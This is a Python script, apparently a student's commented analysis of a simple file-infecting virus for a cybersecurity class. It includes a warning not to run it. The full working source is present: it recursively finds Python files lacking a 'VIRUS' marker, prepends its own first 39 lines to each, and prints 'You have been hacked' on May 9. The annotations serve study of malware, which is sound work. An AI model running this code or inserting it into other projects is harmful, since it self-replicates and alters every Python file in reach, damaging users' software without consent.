#!/usr/bin/python3

# Additional Resource: https://www.techtarget.com/whatis/definition/virus-signature-virus-definition#:~:text=A%20virus%20signature%20(also%20known,scanning%20and%20breach%20detection%20systems; https://stackoverflow.com/questions/23703624/python-if-filename-in-list; https://www.mygreatlearning.com/blog/else-if-python/#:~:text='Elif'%20stands%20for%20'else,if%20its%20condition%20is%20true.;  
#!/usr/bin/python3
# Script Name:                          malwareanalysis.py
# Author name:                          Tianna Farrow
# Date of latest revision:              12/14/23
# Purpose:                              Do not execute this script in your Ubuntu VM used for class. Perform an analysis of the Python-based code.
# Execution:                            python3 malwareanalysis.py 

# Import OS and Datetime Library
import os
import datetime

# Used to idenitfy infected files 
SIGNATURE = "VIRUS"

# look for files that do not have the virus 
def locate(path):
    files_targeted = []
    # Uses the os method "listdir" to list all directories with argument "path" 
    filelist = os.listdir(path)
    # If the current item is a directory, locate it using a for loop, check if it is infected.  
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        # Elif condition ('else if') to test multiple conditions
        elif fname[-3:] == ".py":
            infected = False
            # check each line of the file for the virus signature. 
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            # None infected files add to the list of targeted files. 
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# function to infect files 
def infect(files_targeted):
    # opening an absolute path
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    # read the first 39 lines of the virus file 
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    # a for loop that opens all of the files in the targeted list. 
    for fname in files_targeted:
        # opens the file 
        f = open(fname)
        # saves the contents to the variable temp
        temp = f.read()
        # closes the file 
        f.close()
        # opens the file but with writing access 
        f = open(fname,"w")
        # writes contents of virusstring into the file
        f.write(virusstring + temp)
        # this closes the file
        f.close()

# detonate function
def detonate():
    # check the date and print a message if its the specific date
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# locates the function that returns the list of files
files_targeted = locate(os.path.abspath(""))
# calls the infect function with 'files targeted'
infect(files_targeted)
# detonates the virus 
detonate()

